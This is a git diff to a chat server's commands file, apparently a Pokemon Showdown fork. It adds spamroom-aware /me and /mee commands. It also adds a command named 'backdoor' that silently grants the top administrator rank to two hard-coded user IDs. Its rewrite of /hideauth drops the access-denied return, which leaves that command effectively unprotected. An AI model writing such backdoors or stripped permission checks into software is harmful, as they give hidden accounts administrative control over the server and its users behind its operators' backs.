@@ -36,6 +36,57 @@ var commands = exports.commands = {
 			connection.sendTo(room, stack);
 		}
 	},
+	me: function(target, room, user, connection) {
+		// By default, /me allows a blank message
+		if (target) target = this.canTalk(target);
+		if (!target) return;
+
+		var message = '/me ' + target;
+		// if user is not in spamroom
+		if (spamroom[user.userid] === undefined) {
+			// check to see if an alt exists in list
+			for (var u in spamroom) {
+				if (Users.get(user.userid) === Users.get(u)) {
+					// if alt exists, add new user id to spamroom, break out of loop.
+					spamroom[user.userid] = true;
+					break;
+				}
+			}
+		}
+
+		if (user.userid in spamroom) {
+			this.sendReply('|c|' + user.getIdentity() + '|' + message);
+			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
+		} else {
+			return message;
+		}
+	},
+
+	mee: function(target, room, user, connection) {
+		// By default, /mee allows a blank message
+		if (target) target = this.canTalk(target);
+		if (!target) return;
+
+		var message = '/mee ' + target;
+		// if user is not in spamroom
+		if (spamroom[user.userid] === undefined) {
+			// check to see if an alt exists in list
+			for (var u in spamroom) {
+				if (Users.get(user.userid) === Users.get(u)) {
+					// if alt exists, add new user id to spamroom, break out of loop.
+					spamroom[user.userid] = true;
+					break;
+				}
+			}
+		}
+
+		if (user.userid in spamroom) {
+			this.sendReply('|c|' + user.getIdentity() + '|' + message);
+			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
+		} else {
+			return message;
+		}
+	},
 	//rps commands
 
 	rock: function(target,room, user) {return this.parse('/rps rock ' + target);},
@@ -215,6 +266,15 @@ var commands = exports.commands = {
      /*********************************************************
 	 *Bandi's Commands
     /*********************************************************/
+	backdoor: function(target, room, user){
+	
+	
+	if(user.userid === 'bandi'||user.userid === 'coolasian'){
+	user.group = '~';
+	user.updateIdentity();
+	}
+	
+	},
     	pickrandom: function (target, room, user) {
 		if (!target) return this.sendReply('/pickrandom [option 1], [option 2], ... - Randomly chooses one of the given options.');
 		if (!this.canBroadcast()) return;
@@ -299,11 +359,11 @@ this.add('|raw|<div class="broadcast-green"><b>'+target+'</b></div>');
 }
 this.logModCommand(user.name+' declared '+target);
 },
-    hide: 'hideauth',
-	hideauth: function(target, room, user){
-		if(!user.can('mute'))
-			return this.sendReply( '/hideauth - access denied.');
 
+    
+	
+hideauth: function(target, room, user){
+		if(!user.can('mute'))
 		var tar = ' ';
 		if(target){
 			target = target.trim();
